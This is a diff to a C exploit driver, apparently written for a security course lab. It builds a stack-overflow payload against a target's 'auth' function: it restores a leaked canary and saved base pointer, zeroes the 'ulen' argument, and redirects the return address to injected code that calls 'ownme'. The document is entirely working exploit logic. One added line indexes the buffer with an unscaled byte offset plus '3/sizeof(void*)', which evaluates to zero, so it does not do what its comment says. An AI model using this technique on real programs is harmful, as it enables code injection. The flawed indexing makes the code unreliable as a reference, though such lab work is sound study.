@@ -143,10 +143,9 @@ int main(int argc, char* argv[]) {
    unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
    unsigned mainloop_ownme_diff = ownme_addr - mainloop_ra;
    unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
-   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
+   unsigned auth_bp_loc_user_diff = auth_bp_loc - auth_user;
    unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
-   unsigned mainloop_user_diff = auth_user - mainloop_ra;
-
+   unsigned auth_bp_user_diff = auth_bp - auth_user;
 
    // Use GDB + trial&error to figure out the correct offsets where the:
    // the stack canary
@@ -184,15 +183,11 @@ int main(int argc, char* argv[]) {
    
    fprintf(stderr, "driver: Code generated. Ownme addr=%x\n", cur_ownme_addr);
 
-   // Compute current location of auth user
-   // TODO: USE DIFF BETWEEN AUTH BP/USER TO COMPUTE INSTEAD
-   unsigned cur_user_addr = cur_mainloop_ra + mainloop_user_diff;
-   fprintf(stderr, "driver: Current user addr=%x\n", cur_user_addr);
-
    // Allocate and prepare a buffer that contains the exploit string.
-   // The exploit starts at auth's user and should go until auth's RA.
-   // Therefore, the size of the buffer is auth_ra_user_diff + sizeof(RA)
-   unsigned explsz = auth_ra_user_diff + sizeof(void*);
+   // The exploit starts at auth's user and should go until the argument
+   // ulen, which is 3 words past auth's RA. Therefore, the size of the 
+   // buffer is auth_ra_user_diff + 4 * sizeof(void*)
+   unsigned explsz = auth_ra_user_diff + 4 * sizeof(void*);
    void** expl = (void**)malloc(explsz);
 
    // Initialize the buffer with '\0', just to be on the safe side.
@@ -203,13 +198,20 @@ int main(int argc, char* argv[]) {
    // being assembled on the same architecture/OS as the process being
    // exploited.
 
+   unsigned saved_bp = cur_mainloop_bp - mainloop_auth_bp_diff;
+
+   // Compute current location of auth user
+   unsigned cur_user_addr = saved_bp - auth_bp_user_diff;
+   fprintf(stderr, "driver: Current user addr=%x\n", cur_user_addr);
+
    // Add code to call ownme
    memcpy(expl, code_template, sizeof(code_template));
    // Add auth's canary
    expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
    // Add auth's saved BP
-   expl[auth_bp_user_diff/sizeof(void*)] = 
-      (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
+   expl[auth_bp_loc_user_diff/sizeof(void*)] = (void*)saved_bp;
+   // Set ulen (3 words past bp) to zero so strncmp doesn't segfault
+   expl[auth_bp_loc_user_diff + 3/sizeof(void*)] = (void*)0;
    // Change auth's RA to the address where we injected our code (addr of user)
    expl[auth_ra_user_diff/sizeof(void*)] = 
       (void*)cur_user_addr;
